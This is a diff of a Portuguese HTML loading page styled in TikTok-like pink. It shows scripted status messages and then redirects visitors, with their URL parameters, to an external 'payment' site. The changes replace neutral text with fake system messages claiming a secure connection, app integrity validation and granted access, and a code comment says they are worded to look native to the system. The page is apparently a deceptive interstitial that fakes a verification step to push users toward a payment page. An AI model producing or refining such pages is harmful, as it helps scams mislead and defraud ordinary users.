@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aguarde...</title>
+    <title>Acesso Seguro!</title>
     <style>
-        /* Estilo Minimalista e "Limpo" (Seguro para Ads) */
         body, html {
             margin: 0;
             padding: 0;
@@ -18,10 +17,9 @@
             align-items: center;
             justify-content: center;
             color: #161823;
-            overflow: hidden; /* Evita barras de rolagem desnecessárias */
+            overflow: hidden;
         }
 
-        /* Container Principal */
         .loader-container {
             display: flex;
             flex-direction: column;
@@ -29,104 +27,86 @@
             justify-content: center;
         }
 
-        /* --- O NOVO SPINNER EM GRADIENTE ROSA --- */
+        /* Spinner em Gradiente Rosa */
         .gradient-spinner {
             position: relative;
-            width: 60px;
-            height: 60px;
-            /* O segredo: o border-radius aqui corta o conteúdo interno */
+            width: 55px;
+            height: 55px;
             border-radius: 50%; 
-            /* O fundo do spinner é o gradiente que você quer */
             background: linear-gradient(45deg, #fe2c55, #ff6d8a, #ffb2c1);
-            animation: spin 1s linear infinite;
+            animation: spin 0.9s linear infinite;
             display: flex;
             align-items: center;
             justify-content: center;
         }
 
-        /* O pseudo-elemento cria o "buraco" branco no meio */
         .gradient-spinner::after {
             content: '';
             position: absolute;
-            width: 50px; /* Largura do buraco (60px total - 10px de borda fake) */
-            height: 50px; /* Altura do buraco */
-            background-color: #ffffff; /* Mesma cor do fundo da página */
+            width: 47px; 
+            height: 47px;
+            background-color: #ffffff;
             border-radius: 50%;
         }
 
-        /* Animação de Rotação */
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
-        /* --- ESTILO DO TEXTO ANIMADO --- */
         .loading-text {
             margin-top: 25px;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 500;
-            letter-spacing: -0.3px;
+            color: #515359; /* Cinza suave de sistema */
             text-align: center;
-            min-height: 20px; /* Mantém o espaço mesmo sem texto */
+            min-height: 20px;
             opacity: 1;
-            transition: opacity 0.3s ease-in-out; /* Transição suave de piscar */
+            transition: opacity 0.2s ease-in-out;
         }
 
-        /* Classe para o efeito de fade-out na troca de texto */
         .fade-out {
             opacity: 0;
         }
-
     </style>
 </head>
 <body>
 
     <div class="loader-container">
-        <!-- Novo Spinner com Gradiente Real -->
         <div class="gradient-spinner"></div>
-        
-        <!-- Texto que será alterado pelo JS -->
-        <div class="loading-text" id="status-text">Iniciando...</div>
+        <div class="loading-text" id="status-text">Conectando...</div>
     </div>
 
     <script>
-        // 1. Configurações Principais
         const destinationBaseUrl = "https://payment-nu-dun.vercel.app/";
         const totalWaitTimeSeconds = 5;
 
-        // 2. Sequência de Mensagens e o tempo (em ms) que cada uma aparece
+        // Frases otimizadas para parecerem nativas do sistema
         const messageSequence = [
-            { text: "Acessando conta...", time: 0 },
-            { text: "Verificando atividade dentro do app...", time: 1500 },
-            { text: "Atividade verificada...", time: 3200 },
-            { text: "Seja bem-vinda!", time: 4300 }
+            { text: "Iniciando conexão segura...", time: 0 },
+            { text: "Validando integridade do app...", time: 1400 },
+            { text: "Sincronizando atividade...", time: 2800 },
+            { text: "Acesso liberado. Bem-vinda!", time: 4200 }
         ];
 
         const statusElement = document.getElementById('status-text');
 
-        // 3. Função para trocar o texto com um leve efeito de fade
         function updateTextAnimated(newText) {
-            statusElement.classList.add('fade-out'); // Começa a sumir
-            
+            statusElement.classList.add('fade-out');
             setTimeout(() => {
-                statusElement.innerText = newText; // Troca o texto
-                statusElement.classList.remove('fade-out'); // Reaparece
-            }, 300); // Metade do tempo da transition CSS
+                statusElement.innerText = newText;
+                statusElement.classList.remove('fade-out');
+            }, 200);
         }
 
-        // 4. Agenda a troca de mensagens
         messageSequence.forEach((item) => {
             setTimeout(() => {
                 updateTextAnimated(item.text);
             }, item.time);
         });
 
-        // 5. Função de Redirecionamento (MANTIDA E SEGURA)
         function redirectWithParams() {
-            // Captura os parâmetros da URL atual
             const currentQueryParams = window.location.search;
-
-            // Constrói a URL final de forma robusta
             const joiner = destinationBaseUrl.includes('?') ? '&' : '?';
             const cleanParams = currentQueryParams.startsWith('?') ? currentQueryParams.substring(1) : currentQueryParams;
             
@@ -134,13 +114,10 @@
                 ? `${destinationBaseUrl}${joiner}${cleanParams}`
                 : destinationBaseUrl;
 
-            // Redireciona
             window.location.href = finalUrl;
         }
 
-        // 6. Executa o redirecionamento final após o tempo total
         setTimeout(redirectWithParams, totalWaitTimeSeconds * 1000);
-
     </script>
 </body>
 </html>
